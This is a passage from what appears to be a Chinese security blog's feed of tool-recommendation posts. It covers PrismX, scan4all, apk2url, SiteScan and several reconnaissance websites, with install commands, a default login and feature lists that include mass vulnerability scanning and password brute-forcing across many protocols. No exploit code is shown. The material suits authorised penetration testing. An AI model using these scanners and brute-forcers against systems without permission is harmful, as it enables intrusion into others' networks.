src="https://camo.githubusercontent.com/3ececd4fedfa45ff4fb83ac3da263d4f274e1c918721150138a6de68a2c187c6/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303233303432323139323033333737382e706e67" alt="image-20230422192033778"></a></p><p>expscan</p><p><a href="https://camo.githubusercontent.com/c84c3b6e1b0b14c6c8f34a2083ddaa276bf981fe101dd67391292077eddc8073/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303233303432323139323632333934392e706e67"><img src="https://camo.githubusercontent.com/c84c3b6e1b0b14c6c8f34a2083ddaa276bf981fe101dd67391292077eddc8073/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303233303432323139323632333934392e706e67" alt="image-20230422192623949"></a></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul><li><p>下载并放置资源文件（config.yaml、resource/）到可执行文件的同目录下</p><p><a href="https://niudaii.oss-cn-hangzhou.aliyuncs.com/resource.zip">https://niudaii.oss-cn-hangzhou.aliyuncs.com/resource.zip</a></p></li></ul><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>2023-01-04</p><ul><li>改进 domainscan 模块的 subfinder 模块</li><li>改进 dirscan 模块，根据 url 自动补充字典</li></ul><p>2022-12-21</p><ul><li>增加 exp 模块（nuclei），支持走代理扫描</li></ul><p>2022-11-10</p><ul><li>增加 pocscan 模块</li></ul><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><ul><li>子域名存在泛解析时爆破方式：使用 TTL 判断</li></ul><h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h4 id="1、linux操作系统端口扫描时出现：ping-err-socket-permission-denied"><a href="#1、linux操作系统端口扫描时出现：ping-err-socket-permission-denied" class="headerlink" title="1、linux操作系统端口扫描时出现：ping err, socket: permission denied"></a>1、linux操作系统端口扫描时出现：ping err, socket: permission denied</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ping_group_range="0 2147483647"</span><br></pre></td></tr></tbody></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p><p><a href="https://github.com/boy-hack/ksubdomain">https://github.com/boy-hack/ksubdomain</a></p><p><a href="https://github.com/netxfly/x-crack">https://github.com/netxfly/x-crack</a></p><p><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p><a href="https://github.com/zu1k/nali">https://github.com/zu1k/nali</a></p><p><a href="https://github.com/projectdiscovery/naabu">https://github.com/projectdiscovery/naabu</a></p><p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p><p><a href="https://github.com/Ciyfly/woodpecker">https://github.com/Ciyfly/woodpecker</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>棱镜X-一体化的平台渗透系统</title>
      <link href="/2024/02/24/38-%E6%A3%B1%E9%95%9CX-%E4%B8%80%E4%BD%93%E5%8C%96%E6%B8%97%E9%80%8F%E5%B9%B3%E5%8F%B0/"/>
      <url>/2024/02/24/38-%E6%A3%B1%E9%95%9CX-%E4%B8%80%E4%BD%93%E5%8C%96%E6%B8%97%E9%80%8F%E5%B9%B3%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="棱镜X-一体化跨平台渗透系统"><a href="#棱镜X-一体化跨平台渗透系统" class="headerlink" title="棱镜X | 一体化跨平台渗透系统"></a>棱镜X | 一体化跨平台渗透系统</h1><p>由于微信公众号推送机制改变了，快来<strong>星标</strong>不再迷路，谢谢大家！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DungicHdGVdJpoQp8uIUIs13xBa1eTRSObiczwsfbtDvKU0ibAfkHegDGV2o4daf95jVdO9rnFeny7A/640?wx_fmt=png&amp;wxfrom=13&amp;tp=wxpic" alt="图片"></p><p><em><strong>*0x01 工具介绍*</strong></em></p><p>棱镜 X · 集渗透前置、后置于一体的轻量型跨平台系统。</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3Uibum7ibeZbRygqkwPnJGwefnjlzHGPGJYFDLkURStMWicl6ZqMuFVM0y2FkKR904bVeSJDyUwJApwe1Q/640?wx_fmt=png&amp;from=appmsg&amp;random=0.7899600309116335&amp;wxfrom=13" alt="图片"></p><p><em><strong>*0x02 安装与使用*</strong></em></p><p>一、Linux Amd64 运行示例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/yqcs/prismx/releases/download/1.0.10/prismx_linux_amd64.zip$ unzip prismx_linux_amd64.zip$ cd prismx_linux_amd64$ chmod +x prismx$ ./prismx</span><br></pre></td></tr></tbody></table></figure><p>二、系统默认账号：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prismx/prismx@passw0rd</span><br></pre></td></tr></tbody></table></figure><p>三、界面预览</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3Uibum7ibeZbRygqkwPnJGwefnjUibQFPbUYZiahmNuaZUb4GKM3KYD4qbOvpyfdsH83y8m1D1xVZPkEdTA/640?wx_fmt=png&amp;from=appmsg&amp;random=0.8712758641324061&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scan4all-支持15000+poc漏洞的扫描工具</title>
      <link href="/2024/02/24/5-15000+POC%E6%8E%A8%E8%8D%90/"/>
      <url>/2024/02/24/5-15000+POC%E6%8E%A8%E8%8D%90/</url>
      
        <content type="html"><![CDATA[<h1 id="15000-POC漏洞扫描工具"><a href="#15000-POC漏洞扫描工具" class="headerlink" title="15000+POC漏洞扫描工具"></a>15000+POC漏洞扫描工具</h1><h2 id="POC是什么"><a href="#POC是什么" class="headerlink" title="POC是什么"></a>POC是什么</h2><h3 id="Proof-Of-Concept的缩写。在黑客圈指：观点验证程序。运行这个程序就可以得出预期的结果，也就验证了观点。"><a href="#Proof-Of-Concept的缩写。在黑客圈指：观点验证程序。运行这个程序就可以得出预期的结果，也就验证了观点。" class="headerlink" title="Proof Of Concept的缩写。在黑客圈指：观点验证程序。运行这个程序就可以得出预期的结果，也就验证了观点。"></a>Proof Of Concept的缩写。<em>在黑客圈指：观点验证程序</em>。运行这个程序就可以得出预期的结果，也就验证了观点。</h3><h1 id="链接："><a href="#链接：" class="headerlink" title="链接："></a>链接：</h1><p><a href="https://github.com/GhostTroops/scan4all">https://github.com/GhostTroops/scan4all</a></p><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="https://github.com/GhostTroops/scan4all/releases">https://github.com/GhostTroops/scan4all/releases</a></p><h2 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h2><p><a href="https://github.com/GhostTroops/scan4all/blob/main/static/Installation.md">https://github.com/GhostTroops/scan4all/blob/main/static/Installation.md</a></p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>sudo apt install -y libpcap-dev golang git<br>git clone <a href="https://github.com/hktalent/scan4all.git">https://github.com/hktalent/scan4all.git</a><br>cd scan4all<br>go build</p><h2 id="1-在运行scan4all之前，你必须先安装libpcap库"><a href="#1-在运行scan4all之前，你必须先安装libpcap库" class="headerlink" title="1.在运行scan4all之前，你必须先安装libpcap库"></a>1.在运行scan4all之前，你必须先安装libpcap库</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ubuntu、linux</span><br><span class="line">apt update</span><br><span class="line">apt install -yy libpcap0.8-dev</span><br><span class="line">sudo apt install -y libpcap-dev</span><br><span class="line"># cent os</span><br><span class="line">yum install -yy glibc-devel.x86_64</span><br><span class="line">yum install -yy libpcap</span><br><span class="line"># mac os</span><br><span class="line">brew install libpcap</span><br></pre></td></tr></tbody></table></figure><h2 id="2-前往-https-github-com-hktalent-scan4all-releases-下载scan4all最新版运行"><a href="#2-前往-https-github-com-hktalent-scan4all-releases-下载scan4all最新版运行" class="headerlink" title="2.前往 https://github.com/hktalent/scan4all/releases/ 下载scan4all最新版运行:"></a>2.前往 <a href="https://github.com/hktalent/scan4all/releases/">https://github.com/hktalent/scan4all/releases/</a> 下载scan4all最新版运行:</h2><h2 id="nmap官网"><a href="#nmap官网" class="headerlink" title="nmap官网"></a>nmap官网</h2><p><a href="https://nmap.org/">https://nmap.org/</a></p><h2 id="ubuntu-kali–debian系列"><a href="#ubuntu-kali–debian系列" class="headerlink" title="ubuntu\kali–debian系列"></a>ubuntu\kali–debian系列</h2><p>sudo apt-get install nmap</p><p>sudo apt-get install golang-go</p><h2 id="centos-renhat-红帽系列"><a href="#centos-renhat-红帽系列" class="headerlink" title="centos\renhat-红帽系列"></a>centos\renhat-红帽系列</h2><p>sudo yum install -y nmap</p><p>sudo yum install -y  golang &amp;&amp; sudo yum install -y go</p><h2 id="manjaro-blackarch–arch系列"><a href="#manjaro-blackarch–arch系列" class="headerlink" title="manjaro/blackarch–arch系列"></a>manjaro/blackarch–arch系列</h2><p>sudo pacman -S nmap </p><p>sudo pacman -S golang-go &amp;&amp; sudo pacman -S golang-dev</p><h2 id="aur"><a href="#aur" class="headerlink" title="aur"></a>aur</h2><p>yay -S nmap </p><h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><p>Vulnerabilities Scan；15000+PoC漏洞扫描；[ 23 ] 种应用弱口令爆破；7000+Web指纹；146种协议90000+规则Port扫描；Fuzz、HW打点、BugBounty神器…</p><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/PJG3jJlPv0zkpk1Xic2TUdUUF1iadG5s3cdbxotp5DgJ7UjqD4ic90eRC8A0zwjeb371OhlmtMsOUV2Dtfl8FzTrA/640?wx_fmt=png&amp;from=appmsg&amp;wxfrom=13" alt="图片"></h1><ul><li><p>什么是scan4all：集成 vscan、nuclei、ksubdomain、subfinder等，充分自动化、智能化 并对这些集成的项目进行代码级别优化、参数优化，个别模块,如 vscan filefuzz部分进行了重写<br>原则上不重复造轮子，除非存在bug、问题</p></li><li><p>跨平台：基于golang实现，轻量级、高度可定制、开源，支持Linux、windows、mac os等(go tool dist list)46种不同芯片架构、14种操作系统</p></li><li><p>支持[ 23 ] 种密码爆破，支持自定义字典, 通过 “priorityNmap”: true 开启</p></li><li><ul><li>RDP</li><li>VNC</li><li>SSH</li><li>Socks5</li><li>rsh-spx</li><li>Mysql</li><li>MsSql</li><li>Oracle</li><li>Postgresql</li><li>Redis</li><li>FTP</li><li>Mongodb</li><li>SMB,同时检测 MS17-010（CVE-2017-0143、CVE-2017-0144、CVE-2017-0145、CVE-2017-0146、CVE-2017-0147、CVE-2017-0148）、SmbGhost（CVE-2020-0796）、DCOM(msrpc, port 135, Oxid Scan)</li><li>Telnet</li><li>Snmp</li><li>Wap-wsp（Elasticsearch）</li><li>RouterOs</li><li>HTTP BasicAuth(HttpBasic,Authorization), contains Webdav、SVN（Apache Subversion） crack</li><li>Weblogic，同时通过 enableNuclei=true 开启nuclei，支持T3、IIOP等检测</li><li>Tomcat</li><li>Jboss</li><li>Winrm(wsman)</li><li>POP3/POP3S</li></ul></li><li><p>默认开启http密码智能爆破，需要 HTTP 密码时才会自动启动，无需人工干预</p></li><li><p>检测系统是否存在 nmap ，存在通过 priorityNmap=true 启用 nmap 进行快速扫描，默认开启，优化过的 nmap 参数比 masscan 快 使用 nmap 的弊端：网络不好的是否，因为流量网络包过大可能会导致结果不全 使用 nmap 另外需要将 root 密码设置到环境变量</p></li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PPSSWWDD=yourRootPswd</span><br></pre></td></tr></tbody></table></figure><p>更多参考：config/doNmapScan.sh 默认使用 naabu 完成端口扫描 -stats=true 可以查看扫描进度 能否不扫描端口 ？跳过端口扫描，意外做基于端口指纹进行密码爆破的检测将失效，密码破解功能也一并被跳过</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noScan=true  ./scan4all -l list.txt  -v</span><br></pre></td></tr></tbody></table></figure><ul><li>支持直接使用 nmap xml结果输入：</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scan4all -l nmapScanResults.xml  -v</span><br></pre></td></tr></tbody></table></figure><ul><li><p>快速 15000+ POC 检测功能，PoCs包含：</p><h2 id="Nuclei-Templates-Top-10-statistics"><a href="#Nuclei-Templates-Top-10-statistics" class="headerlink" title="Nuclei Templates Top 10 statistics"></a>Nuclei Templates Top 10 statistics</h2></li><li><ul><li>nuclei POC</li></ul></li></ul><table><thead><tr><th>TAG</th><th>COUNT</th><th>AUTHOR</th><th>COUNT</th><th>DIRECTORY</th><th>COUNT</th><th>SEVERITY</th><th>COUNT</th><th>TYPE</th><th>COUNT</th></tr></thead><tbody><tr><td>cve</td><td>1430</td><td>daffainfo</td><td>631</td><td>cves</td><td>1407</td><td>info</td><td>1474</td><td>http</td><td>3858</td></tr><tr><td>panel</td><td>655</td><td>dhiyaneshdk</td><td>584</td><td>exposed-panels</td><td>662</td><td>high</td><td>1009</td><td>file</td><td>76</td></tr><tr><td>edb</td><td>563</td><td>pikpikcu</td><td>329</td><td>vulnerabilities</td><td>509</td><td>medium</td><td>818</td><td>network</td><td>51</td></tr><tr><td>lfi</td><td>509</td><td>pdteam</td><td>269</td><td>technologies</td><td>282</td><td>critical</td><td>478</td><td>dns</td><td>17</td></tr><tr><td>xss</td><td>491</td><td>geeknik</td><td>187</td><td>exposures</td><td>275</td><td>low</td><td>225</td><td></td><td></td></tr><tr><td>wordpress</td><td>419</td><td>dwisiswant0</td><td>169</td><td>misconfiguration</td><td>237</td><td>unknown</td><td>11</td><td></td><td></td></tr><tr><td>exposure</td><td>407</td><td>0x_akoko</td><td>165</td><td>token-spray</td><td>230</td><td></td><td></td><td></td><td></td></tr><tr><td>cve2021</td><td>352</td><td>princechaddha</td><td>151</td><td>workflows</td><td>189</td><td></td><td></td><td></td><td></td></tr><tr><td>rce</td><td>337</td><td>ritikchaddha</td><td>137</td><td>default-logins</td><td>103</td><td></td><td></td><td></td><td></td></tr><tr><td>wp-plugin</td><td>316</td><td>pussycat0x</td><td>133</td><td>file</td><td>76</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>281 directories, 3922 files.</p><ul><li><p>vscan POC</p></li><li><ul><li>vscan POC包含了：xray 2.0 300+ POC、 go POC等；特别注意，xray POC检测需要有指纹命中后才会触发检测</li></ul></li><li><p>scan4all POC</p></li><li><p>支持 7000+ web 指纹扫描、识别：</p></li><li><ul><li>vscan 指纹：包含 eHoleFinger、 localFinger等</li><li>httpx 指纹</li><li>vscan 指纹</li><li>scan4all 指纹</li></ul></li><li><p>支持146种协议90000+规则port扫描</p></li><li><ul><li>依赖nmap支持的协议、指纹</li></ul></li><li><p>快速HTTP敏感文件检测，可以自定义字典</p></li><li><p>登陆页面检测</p></li><li><p>支持多种类型的输入 - STDIN/HOST/IP/CIDR/URL/TXT</p></li><li><p>支持多种输出类型 - JSON/TXT/CSV/STDOUT</p></li><li><p>高度可集成：可配置将结果统一存储到 Elasticsearch【强烈推荐】</p></li><li><p>智能SSL分析：</p></li><li><ul><li>深入分析，自动关联SSL信息中域名的扫描，如*.xxx.com，并根据配置完成子域遍历，结果自动添加目标到扫描列表</li><li>支持开启智能SSL信息中*.xx.com子域遍历功能， export EnableSubfinder=true，或者在配置文件中调整</li></ul></li><li><p>自动识别域（DNS）关联多个IP的情况，并自动扫描关联的多个IP</p></li><li><p>智能处理：</p></li><li><ul><li>1、当列表中多个域名的ip相同时，合并端口扫描，提高效率</li><li>2、智能处理http异常页面、及指纹计算和学习</li></ul></li><li><p>自动化供应链识别、分析和扫描</p></li><li><p>联动 python3 log4j-scan</p></li><li><ul><li>该版本屏蔽你目标信息传递到 DNS Log Server 的bug，避免暴露漏洞</li><li>增加了将结果发送到 Elasticsearch 的功能，便于批量、盲打</li><li>未来有时间了再实现golang版本 如何使用？</li></ul></li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/MyWork/;cd ~/MyWork/;git clone  https://github.com/hktalent/log4j-scan</span><br></pre></td></tr></tbody></table></figure><ul><li>智能识别蜜罐，并跳过目标，默认该功能是关闭的，可设置EnableHoneyportDetection=true开启</li><li>高度可定制：允许通过config/config.json配置定义自己的字典，或者控制更多细节，包含不限于:nuclei、httpx、naabu等</li><li>支持HTTP请求走私漏洞检测: CL-TE、TE-CL、TE-TE、CL_CL、BaseErr</li></ul><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/PJG3jJlPv0zkpk1Xic2TUdUUF1iadG5s3cjUJMb3rejdart5SUCu6lxWPDPLKeNtLKUficlJJgCvsUpHxaAKSkkNg/640?wx_fmt=png&amp;from=appmsg&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><ul><li>支持 通过参数 Cookie=’PHPSession=xxxx’ ./scan4all -host xxxx.com, 兼容 nuclei、httpx、go-poc、x-ray POC、filefuzz、http Smuggling等</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apk2url-自动提取apk中的ip和域名</title>
      <link href="/2024/02/24/7-apk2url/"/>
      <url>/2024/02/24/7-apk2url/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在渗透测试中，攻击者可以通过对app进行逆向分析。获取app访问的url或者IP。从而对IP进行攻击，本文为大家介绍的这款工具，可以方便的为你分析app中存在的url。</p></blockquote><p>注意：本文仅供学习和研究，坚决反对一切危害网络安全的行为。</p><h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p><code>apk2url</code> 可以轻松地将 URL 和 IP 端点从 APK 文件提取到 .txt 输出。这适合红队、渗透测试人员和开发人员收集信息，以快速识别与应用程序关联的端点。与 APKleaks、MobSF和 AppInfoScanner 相比，apk2url 识别出的端点数量明显增多。apk2url 进行了重写和升级，增加了 IP 支持、更强的正则表达式、自动过滤和 Jadx 反编译。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在<code>kali</code>中安装也很简单，我们只需执行下面命令。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0mi1k/apk2url</span><br><span class="line"># 安装依赖工具</span><br><span class="line">apt-get install apktool</span><br><span class="line">apt-get install jadx</span><br></pre></td></tr></tbody></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatiaFhbmibudQviacyzJHltYPUzWKG35SjmkNuszcicIggl5FXj1lVXhkT9dxAva394icKiaN7OUmmkmjibWw/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>安装完成后，我们执行下面命令即可。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apk2url</span><br></pre></td></tr></tbody></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatiaFhbmibudQviacyzJHltYPUzOiattCed1R8ASPjYwM61ezKWq58BNvpcHFICt63icStvib1ib7R08e4ibNQ/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">接下来，我们随便下载一个app 进行测试。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatiaFhbmibudQviacyzJHltYPUzicJoVJ4ZaVtiaOIicvZHdLl0a7xmDQ6Eq9Wx6RFOwia0g8oebT99n6WwuA/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">为了方便，app随便重命名。这里我改为了33.apk。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apk2url "33.apk"</span><br></pre></td></tr></tbody></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatiaFhbmibudQviacyzJHltYPUzJV9jJmQuewrzWjTOex2nVPeQRVUscL4CG8hao6hMFzXlzHgP65w7Rw/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">完成之后，在endpoints目录下会有txt文件。便是app中存在的url和IP地址。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatiaFhbmibudQviacyzJHltYPUzAl2F9t0JRqxCatRtZGs84eQHVvhNfCrUOTTtatSLEdWcUQBHWquOBg/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><p>在实际中，我们通过对app逆向分析，得到app访问的网站或者IP地址，然后对IP或者域名进行端口扫描，从而进一步获取相关信息。</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SiteScan-专注一站式解决渗透的信息收集任务的工具</title>
      <link href="/2024/02/24/43-%E4%B8%80%E9%94%AE%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/02/24/43-%E4%B8%80%E9%94%AE%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="专注一站式解决渗透的信息收集任务的工具"><a href="#专注一站式解决渗透的信息收集任务的工具" class="headerlink" title="专注一站式解决渗透的信息收集任务的工具"></a>专注一站式解决渗透的信息收集任务的工具</h1><h1 id="SiteScan"><a href="#SiteScan" class="headerlink" title="SiteScan"></a><strong>SiteScan</strong></h1><h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a><strong>工具介绍</strong></h3><p>专注一站化解决渗透测试的信息收集任务，功能包括域名ip历史解析、nmap常见端口爆破、子域名信息收集、旁站信息收集、whois信息收集、网站架构分析、cms解析、备案信息收集、CDN信息解析、是否存在waf检测、后台寻找以及生成检测结果html报告表。</p><p><strong>工具使用</strong></p><p>1、所需库安装</p><p>- </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></tbody></table></figure><p>2、使用</p><h2 id=""><a href="#" class="headerlink" title="- "></a>- </h2><p>- </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python main.py -u http://www.xxx.com</span><br><span class="line">python3 main.py -f url.txt</span><br><span class="line">python3 main.py -u http://www.xxx.com -p http://127.0.0.1:8080</span><br></pre></td></tr></tbody></table></figure><p>3、说明</p><h2 id="-1"><a href="#-1" class="headerlink" title="- "></a>- </h2><h2 id="-2"><a href="#-2" class="headerlink" title="- "></a>- </h2><h2 id="-3"><a href="#-3" class="headerlink" title="- "></a>- </h2><p>- </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件夹：lib文件夹 --- 配置文件。文件夹: output文件夹 --- 探测结果生成的html报告表。文件夹：Third --- 第三方模块, 包含wafwoof识别云waf、JSFinder爬取js文件。文件：commom.py --- 用户输入处理、网址存活检测及处理最终结果并生成html报告。文件：config.py --- requests库的请求设置：header头部、超时时间、google的url提取量、网络错误尝试次数、重定向和代理设置，以及定义扫描的端口。文件：main.py --- 主函数入口。文件：request.py --- 封装的所有请求类。</span><br></pre></td></tr></tbody></table></figure><h3 id="工具展示"><a href="#工具展示" class="headerlink" title="工具展示"></a><strong>工具展示</strong></h3><p>1、程序运行过程：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic3TKeDsO8PTEs03RaIrGRicgBmklOYXnibv7GjsXVXiaKLCnACxE7WwTzcAO1lqpXTXOYhDcOu5mkwMg/640?wx_fmt=png&amp;from=appmsg&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>2、生成的html报告：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic3TKeDsO8PTEs03RaIrGRicgWLgUUJxohStmwZ784YXk0NM1Xgn4h8JmPV2xpUJuTdlYR3d1WW3anw/640?wx_fmt=png&amp;from=appmsg&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>推荐一些好用的信息收集网站</title>
      <link href="/2024/02/24/44-%E4%B8%80%E4%BA%9B%E7%89%B9%E5%A5%BD%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/"/>
      <url>/2024/02/24/44-%E4%B8%80%E4%BA%9B%E7%89%B9%E5%A5%BD%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>网站信息收集相关网址推荐，先看截图</p><p><img src="https://pic.imgdb.cn/item/656a220dc458853aefc32447.png" alt="img"></p><p>右侧都属于相关网络安全网址。</p><h2 id="1、whois查询："><a href="#1、whois查询：" class="headerlink" title="1、whois查询："></a>1、whois查询：</h2><p>​站长：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a>     （所有查询到的信息不打码）</p><p>​万网：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a>     （相关敏感信息会无法查看）</p><h2 id="2、ip查询真伪："><a href="#2、ip查询真伪：" class="headerlink" title="2、ip查询真伪："></a>2、ip查询真伪：</h2><p>​ip归属地单个查询及相关信息：ipip.net</p><p><img src="https://pic.imgdb.cn/item/656a2232c458853aefc37f44.png" alt="图片"></p><p>​多种集合ip查询：<a href="https://www.ip138.com/">https://www.ip138.com/</a></p><p><img src="https://pic.imgdb.cn/item/656a2245c458853aefc3b093.png" alt="图片"></p><p>​ip 批量查询：<a href="http://gongju.haozhuti.cn/">http://gongju.haozhuti.cn/</a>      （无限制）</p><p><img src="https://pic.imgdb.cn/item/656a2257c458853aefc3dc8e.png" alt="图片"></p><p>​ip反查域名：<a href="https://www.dnsgrep.cn/ip">https://www.dnsgrep.cn/ip</a>      （速度快，多）</p><p><img src="https://pic.imgdb.cn/item/656a2260c458853aefc3f216.png" alt="图片"></p><p>​多地ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a>   （有时绕过cdn会用到）</p><p><img src="https://pic.imgdb.cn/item/656a226cc458853aefc40bb7.png" alt="图片"></p><h2 id="3、网站、域名、服务器备案查询："><a href="#3、网站、域名、服务器备案查询：" class="headerlink" title="3、网站、域名、服务器备案查询："></a>3、网站、域名、服务器备案查询：</h2><p>​ICP备案查询：<a href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a></p><p><img src="https://pic.imgdb.cn/item/656a227ac458853aefc42c36.png" alt="图片"></p><h2 id="4、网络空间测绘"><a href="#4、网络空间测绘" class="headerlink" title="4、网络空间测绘"></a>4、网络空间测绘</h2><p>​钟馗之眼：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p><img src="https://pic.imgdb.cn/item/656a2285c458853aefc4461e.png" alt="图片"></p><p>​撒旦：<a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p><img src="https://pic.imgdb.cn/item/656a228fc458853aefc45d65.png" alt="图片"></p><p>​fofa（试运行）：<a href="https://fofa.info/">https://fofa.info/</a></p><p><img src="https://pic.imgdb.cn/item/656a229ac458853aefc47a7c.png" alt="图片"></p><h2 id="5、指纹："><a href="#5、指纹：" class="headerlink" 